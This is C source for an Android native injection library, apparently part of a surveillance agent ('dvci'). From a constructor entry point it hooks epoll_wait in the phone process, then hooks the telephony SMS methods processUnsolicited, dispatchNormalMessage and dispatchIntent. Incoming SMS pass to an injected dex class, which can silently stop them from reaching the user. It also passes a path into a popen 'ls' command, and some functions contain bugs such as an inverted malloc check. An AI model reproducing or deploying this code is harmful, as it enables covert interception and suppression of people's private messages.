/*
 *  Collin's Dynamic Dalvik Instrumentation Toolkit for Android
 *  Collin Mulliner <collin[at]mulliner.org>
 *
 *  (c) 2012,2013
 *
 *  License: LGPL v2.1
 *
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <string.h>
#include <termios.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <stdlib.h>
#include <jni.h>


#include "hook.h"
#include "dexstuff.h"
#include "dalvik_hook.h"
#include "base.h"
#include "ipc_examiner.h"
char *dumpPath    =  ".................____________.......................";
char *quite_needle = ".................____________......................";
char *dexFile = "/data/local/tmp/ddiclasses.dex";
char *dumpDir = NULL;
#undef log
#define USE_BD

#ifdef DEBUG
/*
 * Android log priority values, in ascending priority order.
 */
typedef enum android_LogPriority
{
   ANDROID_LOG_UNKNOWN = 0, ANDROID_LOG_DEFAULT, /* only for SetMinPriority() */
   ANDROID_LOG_VERBOSE, ANDROID_LOG_DEBUG, ANDROID_LOG_INFO, ANDROID_LOG_WARN, ANDROID_LOG_ERROR, ANDROID_LOG_FATAL, ANDROID_LOG_SILENT, /* only for SetMinPriority(); must be last */
} android_LogPriority;

//memset(tag,0,256-1);
char tag[256];
#define log(...) {\
tag[0]=tag[1]=0;\
snprintf(tag,256,"smsdispatcht:%s",__FUNCTION__);\
__android_log_print(ANDROID_LOG_DEBUG, tag , __VA_ARGS__);}
#define logf(...) {FILE *f = fopen("/data/local/tmp/log", "a+");\
        if(f!=NULL){\
        fprintf(f,"%s: ",__FUNCTION__);\
        fprintf(f, __VA_ARGS__);\
        fflush(f); fclose(f); }}
#else
#define log(...)
#endif
struct dalvik_cache_t
{
   // for the call inside the hijack
   jclass cls_h;
   jmethodID mid_h;
};

static struct hook_t eph;
static struct dexstuff_t d;
static struct dalvik_hook_t dpdu;
static struct dalvik_hook_t dispatchIntent;
static struct dalvik_hook_t processUnsolicited_dh;
static struct dalvik_cache_t processUnsolicited_cache;
static struct dalvik_hook_t dispatchNormalMessage;


// switch for debug output of dalvikhook and dexstuff code
static int debug;

static void my_log(char *msg)
{
   log("%s", msg)
}
static void my_log2(char *msg)
{
   if (debug)
      log("%s", msg);
}
long int and_maj = -1;
long int and_min = -1;
long int and_rel = -1;
static void get_android_version()
{
   char android_version[10] = "";
   char *command = "getprop ro.build.version.release";
   FILE *fp = popen(command, "r");
   if (fgets(android_version, sizeof(android_version), fp) != NULL) {
      and_maj = strtol(&android_version[0], NULL, 10);
      and_min = strtol(&android_version[2], NULL, 10);
      and_rel = strtol(&android_version[4], NULL, 10);

      log("[*] version %s %d.%d.%d\n", android_version, and_maj, and_min, and_rel);
   } else {
      log("failed to get version\n");
   }
   if (fp) {
      pclose(fp);
   }
}
char * _fgetln(FILE *stream,size_t *len)
{
   static char *buffer = NULL;
   static size_t buflen = 0;
   if (stream == NULL) {
      log("stream null \n");
      return NULL;
   }
   if (buflen == 0) {
      buflen = 512;
      if ((buffer = malloc(buflen + 1)) == NULL){
         log("fatal: malloc: out of memory");
         return NULL;
      }
   }
   if (fgets(buffer, buflen + 1, stream) == NULL){
      log("no data available");
      free(buffer);
      return NULL;
   }
   *len = strlen(buffer);
   while (*len == buflen && buffer[*len - 1] != '\n') {
      char *tmp_buffer = NULL;
      if ((tmp_buffer = realloc(buffer, 2 * buflen + 1)) == NULL){
         log("fatal: realloc: out of memory");
         free(buffer);
         return NULL;
      }
      buffer = tmp_buffer;
      if (fgets(buffer + buflen, buflen + 1, stream) == NULL){
         log("no more data available");
         free(buffer);
         return NULL;
      }
      *len += strlen(buffer + buflen);
      buflen *= 2;
   }
   return buffer;
}
ssize_t getline(char **lineptr, size_t *n, FILE *stream)
{
   char *ptr;
   if(stream == NULL){
      log("stream null \n");
            return -1;
   }
   ptr = _fgetln(stream, n);
   if (ptr == NULL) {
      log("ptr null \n");
      return -1;
   }
   /* Free the original ptr */
   if (*lineptr != NULL)
      free(*lineptr);
   /* Add one more space for '\0' */
   size_t len = *n + 1;
   /* Update the length */
   n[0] = len;
   /* Allocate a new buffer */
   *lineptr = malloc(len);
   if(*lineptr){
      log("failed to malloc %d \n",len);
      return -1;
   }
   /* Copy over the string */
   memcpy(*lineptr, ptr, len - 1);
   /* Write the NULL character */
   (*lineptr)[len - 1] = '\0';
   /* Return the length of the new buffer */
   log("got %d :%s \n");
   return len;
}
// returned char pointer must be freed by the caller
static char * get_gobbler_pat(char *path)
{
   char *line = NULL;
   char *command = NULL;
   int read=0,len;
   if(path==NULL || strlen(path) <=0 ){
      log("invalid path passed\n");
      return line;
   }
   // allocate "ls " and the \0 plus strlen path
   size_t cmd_len = strlen(path) + 4;
   if(cmd_len>512){
      log("invalid path too long\n");

   }
   log("allocating %d long string",cmd_len);
   command=malloc(cmd_len);
   if(command == NULL){
      log("failed to alloc memory");
      return line;
   }
   memset(command,cmd_len,'\0');
   snprintf(command,cmd_len,"ls %s",path);
   log("calling %s",command);
   FILE *fp = popen(command, "r");
   if (fp) {
      while ((read = getline(&line, &len, fp)) != -1) {
         log("[*] files %s \n", line);
      }
      if (line) {
         if (strstr(line, path) == NULL) {
            free(line);
            log("failed to get gobbler\n");
         } else {
            log("got file %s\n", line);
         }
      }
   }else{
      log("failed to call %s\n",command);
   }
   if(command){
      free(command);
      command = NULL;
   }
   if (fp) {
      pclose(fp);
   }
   return line;
}
/* use global class and methods id to be used
 * during the printing of the exception stack.
 * We choose global ,to cache the lookup process
 * and be more responsive
 */
static jclass throw_class = NULL;
static jmethodID mid_throw_getCause = NULL;
static jmethodID mid_throw_getStackTrace = NULL;
static jmethodID mid_throw_toString = NULL;
static jclass frame_class = NULL ;
static jmethodID mid_frame_toString = NULL;

static int initialize_for_exception(JNIEnv * pEnv)
{

   throw_class = (*pEnv)->FindClass(pEnv, "java/lang/Throwable");
   if (throw_class == NULL) {
      log("failed to find \"java/lang/Throwable class\"");
      return 1;
   }
   mid_throw_getCause = (*pEnv)->GetMethodID(pEnv,throw_class,"getCause", "()Ljava/lang/Throwable;");
   if (mid_throw_getCause == NULL) {
      log("failed to find \"getCause method\"");
      throw_class = NULL;
      return 1;
   }
   mid_throw_getStackTrace = (*pEnv)->GetMethodID(pEnv, throw_class,"getStackTrace","()[Ljava/lang/StackTraceElement;");
   if (mid_throw_getStackTrace == NULL) {
      log("failed to find \"getStackTrace method\"");
      throw_class = NULL;
      return 1;
   }
   mid_frame_toString = (*pEnv)->GetMethodID(pEnv,throw_class, "toString", "()Ljava/lang/String;");
   if (mid_frame_toString == NULL) {
      log("failed to find \"toString method\"");
      throw_class = NULL;
      return 1;
   }
   frame_class = (*pEnv)->FindClass(pEnv, "java/lang/StackTraceElement");
   if (frame_class == NULL) {
      log("failed to find \"java/lang/StackTraceElement class\"");
      throw_class = NULL;
      return 1;
   }
   mid_frame_toString = (*pEnv)->GetMethodID(pEnv, frame_class,"toString","()Ljava/lang/String;");
   if (mid_frame_toString == NULL) {
      log("failed to find \"frame_class->toString method\"");
      throw_class = NULL;
      return 1;
   }
   log(" initialized data for exceptions\n");
   return 0;
}
static void print_exception(JNIEnv *a_jni_env, jthrowable a_exception,int a_error_msg)
{
   if (a_exception == NULL) {
      log("null exception passed");
      return;
   }
   if (throw_class == NULL) {
      if (initialize_for_exception(a_jni_env)) {
         log("initialize_for_exception, failed");
         return;
      }
   }

   // Get the array of StackTraceElements.
   jobjectArray frames = (jobjectArray)(*a_jni_env)->CallObjectMethod(a_jni_env, a_exception, mid_throw_getStackTrace);
   jsize frames_length = 0;
   if(frames) {
   frames_length = (*a_jni_env)->GetArrayLength(a_jni_env, frames);
   if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
      (*a_jni_env)->ExceptionClear(a_jni_env);
      log("got an mid_throw_getStackTrace!!");
      return;
   }
   }else{
      log("failed to get frames!!");
      return;
   }

   // Add Throwable.toString() before descending
   // stack trace messages.
   if (frames) {
      jstring msg_obj = (jstring)(*a_jni_env)->CallObjectMethod(a_jni_env, a_exception, mid_throw_toString);
      if (msg_obj == NULL) {
         log("mid_throw_toString failed");
         if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
            (*a_jni_env)->ExceptionClear(a_jni_env);
            log("got an mid_throw_toString!!");
         }
         return;
      }
      const char* msg_str = (*a_jni_env)->GetStringUTFChars(a_jni_env, msg_obj, 0);
      if (msg_str == NULL) {
         log("getUTF failed");
         if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
            (*a_jni_env)->ExceptionClear(a_jni_env);
            log("got an mid_throw_toString!!");
         }
         return;
      }
      // If this is not the top-of-the-trace then
      // this is a cause.
      if (a_error_msg == 0) {
         log("\nCaused by: %s", msg_str);
      } else {
         log("%s", msg_str);
         a_error_msg += 1;
      }
      (*a_jni_env)->ReleaseStringUTFChars(a_jni_env, msg_obj, msg_str);
      (*a_jni_env)->DeleteLocalRef(a_jni_env, msg_obj);
   }

   // Append stack trace messages if there are any.
   if (frames_length > 0) {
      jsize i = 0;
      for (i = 0; i < frames_length; i++) {
         // Get the string returned from the 'toString()'
         // method of the next frame and append it to
         // the error message.
         jobject frame = (*a_jni_env)->GetObjectArrayElement(a_jni_env, frames, i);
         if (frame == NULL) {
            log("get frame failed");
            if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
               (*a_jni_env)->ExceptionClear(a_jni_env);
               log("got an GetObjectArrayElement!!");
            }
            return;
         }
         jstring msg_obj = (jstring)(*a_jni_env)->CallObjectMethod(a_jni_env, frame, mid_frame_toString);
         if (msg_obj == NULL) {
            log("mid_frame_toString failed");
            if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
               (*a_jni_env)->ExceptionClear(a_jni_env);
               log("got an mid_frame_toString!!");
            }
            (*a_jni_env)->DeleteLocalRef(a_jni_env, frame);
            return;
         }
         const char* msg_str = (*a_jni_env)->GetStringUTFChars(a_jni_env, msg_obj, 0);
         log("\n        %s", msg_str);
         (*a_jni_env)->ReleaseStringUTFChars(a_jni_env, msg_obj, msg_str);
         (*a_jni_env)->DeleteLocalRef(a_jni_env, msg_obj);
         (*a_jni_env)->DeleteLocalRef(a_jni_env, frame);
         if ((*a_jni_env)->ExceptionOccurred(a_jni_env)) {
            (*a_jni_env)->ExceptionClear(a_jni_env);
            log("got an DeleteLocalRef!!");
            return;
         }
      }
   }

   // If 'a_exception' has a cause then append the
   // stack trace messages from the cause.
   if (0 != frames) {
      jthrowable cause = (jthrowable)(*a_jni_env)->CallObjectMethod(a_jni_env, a_exception, mid_throw_getCause);
      if (cause) {
         print_exception(a_jni_env, cause, a_error_msg);
      }
   }
}
static int load_dext(char * dext_path,char **classes)
{

   int cookie = 0;
   int res =0;
   char *file=dext_path;
   if (dext_path == NULL) {
      log(" loaddex null path passed\n");
      return 1;
   }else{
      log(" loaddex path %s\n",dext_path);
   }
   if(strstr(dext_path,"*")!=NULL){
      log(" loaddex gobbler passed\n");
      file=get_gobbler_pat(dext_path);
      if(file!=NULL){
         cookie = dexstuff_loaddex(&d, file);
      }else{
         file = dext_path;
      }
      return 1;
   }
   cookie = dexstuff_loaddex(&d, file);
   log("loaddex res = %x\n", cookie)
   if (!cookie) {
      char *dext_file = file;
      while (strstr(dext_file, "/") != NULL) {
         dext_file = strstr(dext_file, "/");
      }
      if (dext_file == NULL) {
         dext_file = "";
      }
      log("make sure /data/dalvik-cache/ is world writable and delete data@local@tmp@%s", dext_file);
      res=1;
   }
   if(res==0){

   int  i = 0;
   void *clazz = NULL;
   if(classes){
   while (classes[i] != NULL) {
      //log("loading class %s", classes[i]);
         clazz = dexstuff_defineclass(&d, classes[i], cookie);
         //log("Cfg = 0x%x\n", clazz);
         if (clazz == 0) {
            log("failure loading class %s", classes[i]);
            res = 1;
            break;
         }
         i++;
      }
   }
   }
   if(file != dext_path){
      log("Freeing file\n");
      free(file);
   }

   return res;
}
//private void processUnsolicited (Parcel p)
static int my_processUnsolicited(JNIEnv *env, jobject this, jobject p)
{
   jint callOrig = 1;
   int doit = 1;
   if( p== 0x0){
      log("invalid parcel pointer");
      return callOrig;
   }
   log("parcel pointer p=%p",p);

/*
   if(ops != 1003){
      log("not our ops %d",ops);
      return callOrig;
   }
   */
   //log("start! c=0x%x m=0x%x\n", processUnsolicited_cache.cls_h, processUnsolicited_cache.mid_h);
   (*env)->MonitorEnter(env,this);
   char *classes[] = { "com/android/dvci/event/OOB/SMSDispatch", "com/android/dvci/util/Reflect", "com/android/dvci/util/LowEventHandlerDefs", NULL };
   if (processUnsolicited_cache.cls_h == 0) {
      if (load_dext(dumpPath, classes)) {
         log("failed to load class ");
         doit = 0;
      }
   } else {
    log("using cache");
  }

   if (doit) {
      // call static method and passin the sms
      //log(" parcel = 0x%x\n", p)
      if (processUnsolicited_cache.cls_h == 0) {
         processUnsolicited_cache.cls_h = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");
      }
      if (processUnsolicited_cache.cls_h != 0) {
         if (processUnsolicited_cache.mid_h == 0) {
            processUnsolicited_cache.mid_h = (*env)->GetStaticMethodID(env, processUnsolicited_cache.cls_h, "dispatchParcel", "(Landroid/os/Parcel;)I");
         }
         if (processUnsolicited_cache.mid_h) {
            callOrig = (*env)->CallStaticIntMethod(env, processUnsolicited_cache.cls_h, processUnsolicited_cache.mid_h, p);
         } else {
            log("method not found!\n")
         }
      } else {
         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
      }
   }
   // call original SMS dispatch method
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionDescribe(env);
      (*env)->ExceptionClear(env);
   }
   (*env)->MonitorExit(env,this);
   dalvik_prepare(&d, &processUnsolicited_dh, env);

   if (callOrig) {

      (*env)->CallVoidMethod(env, this, processUnsolicited_dh.mid, p);
      if ((*env)->ExceptionOccurred(env)) {
         log("got an exception!!");
         (*env)->ExceptionClear(env);
      } else {
         //log("success calling : %s\n", processUnsolicited_dh.method_name)
      }
   } else {
      //log("skipping pdu args for call : %s\n", processUnsolicited_dh.method_name)
      callOrig = 1;
   }
   dalvik_postcall(&d, &processUnsolicited_dh);

   return callOrig;
}
static int my_dispatchNormalMessage(JNIEnv *env, jobject obj, jobject smsMessageBase)
{
   jint callOrig = 1;
      char *classes[]={
            "com/android/dvci/event/OOB/SMSDispatch",
            "com/android/dvci/util/Reflect",
            "com/android/dvci/util/LowEventHandlerDefs",
            NULL
      };
      if (load_dext(dumpPath,classes)) {
         log("failed to load class ");
      } else {
         // call static method and passin the sms
         log("smsMessageBase = 0x%x\n", smsMessageBase)
         jclass smsd = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");

      if (smsd) {
         jmethodID staticId = (*env)->GetStaticMethodID(env, smsd, "dispatchNormalMessage", "(Ljava/lang/Object;)I");

         if (staticId) {
            jvalue args[1];
            /*
             typedef union jvalue {
             jboolean z;
             jbyte    b;
             jchar    c;
             jshort   s;
             jint     i;
             jlong    j;
             jfloat   f;
             jdouble  d;
             jobject  l;
             } jvalue;
             */
            args[0].l = smsMessageBase;
            //NativeType CallStatic<type>MethodA(JNIEnv *env, jclass clazz,jmethodID methodID, jvalue *args);

            callOrig = (*env)->CallStaticIntMethodA(env, smsd, staticId, args);
         } else {
            log("method not found!\n")
         }
      } else {
         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
      }
   }
   // call original SMS dispatch method
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionClear(env);

   }
   jvalue args[1];
   dalvik_prepare(&d, &dispatchNormalMessage, env);

   if (callOrig) {
      args[0].l = smsMessageBase;
      callOrig = (*env)->CallIntMethodA(env, obj, dispatchNormalMessage.mid, args);
      log("success calling : %s\n", dispatchNormalMessage.method_name)
   } else {
      log("skipping pdu args for call : %s\n", dispatchNormalMessage.method_name)
      callOrig = 1;
   }
   dalvik_postcall(&d, &dispatchNormalMessage);
   return callOrig;
}

//intent.putExtra("pdus", pdus);
//intent.putExtra("format", tracker.getFormat());
//        dispatchIntent(intent, android.Manifest.permission.RECEIVE_SMS,AppOpsManager.OP_RECEIVE_SMS, resultReceiver);
static void my_dispatchIntent(JNIEnv *env, jobject this, jobject intent, jobject permission, jint app, jobject receiver)
{
   int callOrig = 1;
   log("we are in!");
   if (load_dext(dumpPath,NULL)) {
      log("failed to load class ");
   } else {
      // call static method and passin the sms
      log("intent = 0x%x\n", intent)

      jclass smsd = (*env)->FindClass(env, "com/android/dvci/event/OOB/SMSDispatch");
      if (smsd) {
         jmethodID staticId = (*env)->GetStaticMethodID(env, smsd, "dispatchIntent", "(Landroid/content/Intent;)I");
         if (staticId) {
            jvalue args[1];

            args[0].l = intent;
            //NativeType CallStatic<type>MethodA(JNIEnv *env, jclass clazz,jmethodID methodID, jvalue *args);
            callOrig = (*env)->CallStaticIntMethodA(env, smsd, staticId, args);
         } else {
            log("method not found!\n")
         }
      } else {
         log("com/android/dvci/event/OOB/SMSDispatch not found!\n")
      }
   }
   // call original SMS dispatch method
   jvalue args[4];
   log("dalvik_prepare!\n")
   dalvik_prepare(&d, &dispatchIntent, env);
   log("dalvik_called\n")
   if (callOrig) {
      log("calling orig prepare args!\n")
      args[0].l = intent;
      args[1].l = permission;
      args[2].i = app;
      args[3].l = receiver;
      log("args ok!\n")
      (*env)->CallVoidMethodA(env, this, dispatchIntent.mid, args);
      log("orig called ok!\n")

   } else {
      log("skipping message insertion : %s\n", dispatchIntent.method_name)
   }
   dalvik_postcall(&d, &dispatchIntent);
}
static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout)
{
   int (*orig_epoll_wait)(int epfd, struct epoll_event *events, int maxevents, int timeout);
   orig_epoll_wait = (void*) eph.orig;
   // remove hook for epoll_wait
   hook_precall(&eph);

   // resolve symbols from DVM
   dexstuff_resolv_dvm(&d);
   log("my_epoll_wait: try_hook\n")
   if (and_maj == 4){
      //private void processUnsolicited (Parcel p) {
      processUnsolicited_cache.cls_h = NULL;
      processUnsolicited_cache.mid_h = NULL;
      dalvik_hook_setup(&processUnsolicited_dh, "Lcom/android/internal/telephony/RIL;", "processUnsolicited", "(Landroid/os/Parcel;)V", 2, my_processUnsolicited);
      if (dalvik_hook(&d, &processUnsolicited_dh)) {
         log("my_epoll_wait: hook processUnsolicited ok\n")
      } else {
         log("my_epoll_wait: hook processUnsolicited fails\n")
      }
      if ( and_min < 4) {
         dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/SMSDispatcher;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
         if (dalvik_hook(&d, &dispatchNormalMessage)) {
            log("my_epoll_wait: hook dispatchNormalMessage ok\n")
         } else {
            log("my_epoll_wait: hook dispatchNormalMessage fails\n")
         }
      } else if (and_min >= 4) {



         dalvik_hook_setup(&dispatchNormalMessage, "Lcom/android/internal/telephony/InboundSmsHandler;", "dispatchNormalMessage", "(Lcom/android/internal/telephony/SmsMessageBase;)I", 2, my_dispatchNormalMessage);
         if (dalvik_hook(&d, &dispatchNormalMessage)) {
            log("my_epoll_wait: hook dispatchNormalMessage ok\n")
         } else {
            log("my_epoll_wait: hook dispatchNormalMessage fails\n")
         }

      }
   } else {
      log("injection not possible \n");
      return 1;
   }
   int res = orig_epoll_wait(epfd, events, maxevents, timeout);
   return res;
}
void create_cnf()
{
   int full_path_log_filename_length = strlen(dumpDir) + 1 + strlen("pa.cnf") + 1;
   char * full_path_log_filename = malloc(sizeof(char) * full_path_log_filename_length);
   if (full_path_log_filename != NULL) {
      snprintf(full_path_log_filename, full_path_log_filename_length, "%s/pa.cnf", dumpDir);
      int fd = open(full_path_log_filename, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);
      if (fd > 0) {
         log("create_cnf: wrote log file %s fd %d\n", full_path_log_filename, fd);
         close(fd);
      }else{
         log("create_cnf: open failed with file %s",full_path_log_filename);
      }
      free(full_path_log_filename);
   }else{
      log("create_cnf: malloc failed");
   }
}
char * findLast(char *where, char *what){

   char *ptr = where;
   char *prevptr = NULL;
   if(what == NULL  || where == NULL){
      log("findLast: invalid ponter passed");
      return NULL;
   }
   while( (ptr = strstr(ptr,what)))
   {
   // increment ptr here to prevent
   // an infinite loop
   prevptr = ptr++;
   }
   // now, prevptr contains the last occurrence
   return prevptr;
}


// set my_init as the entry point
void __attribute__ ((constructor)) my_init(void);

void my_init(void)
{
   char createcnf = 0;
   char *lastAt = NULL;
   log("started\n");
   get_android_version();

#ifdef DEBUG
   debug = 1;
#endif
   log("my_init:dumpPath is %s\n",dumpPath);
   if( strncmp(quite_needle,dumpPath,strlen(quite_needle)) == 0 ){
      log("my_init: got path %s\n",dumpPath);
      dumpPath = dexFile;
   }else{
      log("my_init: path patched %s\n",dumpPath);

      dexFile=findLast(dumpPath,"/");
      if(dexFile != NULL){
         dexFile++;
         if(strncmp("/data/app/",dumpPath,strlen("/data/app/"))==0 && (lastAt = findLast(dumpPath,"@"))!=NULL){
            /*
             * In this case dumpath has been configured as:
             * /data/app/<agentName>.apk@<agentPackage>
             * So we need to :
             * 1) extract the correct dumpDir that is /data/data/<agentPackage>/files/m4 and place in dumpDir
             * 2) extract the apk file, wihch is /data/app/<agentName>.apk and place in dumpPath
             */
            int len = strlen("/data/data/")+strlen(dumpPath)-(lastAt-dumpPath)+11; // 11 = /files/m4/\0
            log("allocating dumpDir[%d] strlen(lastAt)-1 = %d lastAt=%s \n",len,strlen(lastAt)-1,lastAt);
            dumpDir=calloc(1,len); // 11 = /files/m4/\0
            if(dumpDir == NULL ){
               log("failed to alloc dumpDir[%d]  \n",len);
            }else{
               snprintf(dumpDir, len, "/data/data/%s/files/m4", lastAt+1);
               dexFile=strndup(dumpPath, lastAt - dumpPath );
               dumpPath = dexFile;
            }

         }else{
            dumpDir=strndup(dumpPath, dexFile - dumpPath);
         }
         if(dumpDir == NULL ){
            log("failed to duplicate dumpPath=%s\n",dumpPath);
         }else{
            log("duplicate dumpPath=%s\n",dumpPath);
            log("dumpDir=%s\n",dumpDir);
            log("dexFile=%s\n",dexFile);
                  createcnf = 1;
         }
      }

   }
   // set log function for  libbase (very important!)
   set_logfunction(my_log2);
   // set log function for libdalvikhook (very important!)
   dalvikhook_set_logfunction(my_log2);

   if(hook(&eph, getpid(), "libc.", "epoll_wait", my_epoll_wait, 0) && createcnf==1){
      create_cnf();
   }
   dexstuff_resolv_dvm(&d);
   //log("my_init: printClass\n");
   //dalvik_dump_class(&d,"");
}
